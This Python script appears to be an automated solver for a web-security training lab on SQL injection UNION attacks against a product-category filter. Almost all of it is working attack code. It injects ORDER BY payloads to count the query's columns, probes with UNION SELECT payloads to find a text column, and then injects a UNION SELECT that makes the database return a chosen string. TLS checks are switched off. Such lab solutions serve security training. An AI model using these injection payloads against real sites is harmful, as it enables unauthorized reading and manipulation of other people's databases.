from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import argparse
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", action="store_true")
    return parser.parse_args()


def print_info(string):
    print(f"\033[1;94m[*]\033[00m {string}")


def print_success(string):
    print(f"\033[1;92m[+]\033[00m {string}")


def print_fail(string):
    print(f"\033[1;91m[-]\033[00m {string}")
    exit(1)


def verify_lab_accessible(url):
    print_info("Checking if given URL is accessible...")
    resp = requests.get(url)
    if resp.status_code != 504:
        print_success("URL is accessible.\n")
    else:
        print_fail("URL is inaccessible. Reopen the lab and use new URL.")


def verify_lab_solved(url):
    print_info("Revisiting URL to verify if attack was successful...")
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    if soup.select_one("#notification-labsolved"):
        print_success("Attack successful. Lab solved.")
    else:
        print_fail("Lab unsolved. Ensure...")


def solve_lab(url, proxies):
    print_info("Extracting string value provided by lab...")
    resp = requests.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    hint = soup.select_one("#hint").text

    value = re.match(r"Make the database retrieve the string: '([^']+)'", hint).group(1)
    print_success(f"Provided string value: {value}\n")

    url = urljoin(url, "/filter")
    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} --"}
        resp = requests.get(url, params=params, proxies=proxies, verify=False)
        print_info(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    print_success(f"There are {num_columns} columns.\n")
    print_info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = requests.get(url, params=params, proxies=proxies, verify=False)
        print_info(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        print_fail("Unable to find a column with the string data type")
    else:
        print_success(f"Column {i} has the string data type.\n")

    # Construct columns string
    columns = ["null"] * num_columns
    columns[i] = f"'{value}'"
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} --"}

    print_info(
        f'Performing SQL injection UNION attack by visiting "{url}" with the following parameters:'
    )
    print(params)

    requests.get(url, params=params, proxies=proxies, verify=False)
    print_success("SQL injection UNION attack performed.\n")


def main():
    args = get_args()
    root_url = urljoin(args.url, "/")

    verify_lab_accessible(root_url)

    proxies = None
    if args.use_proxy:
        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
        print_info('Using "http://127.0.0.1:8080" as a proxy')

    solve_lab(root_url, proxies)
    verify_lab_solved(root_url)


if __name__ == "__main__":
    main()
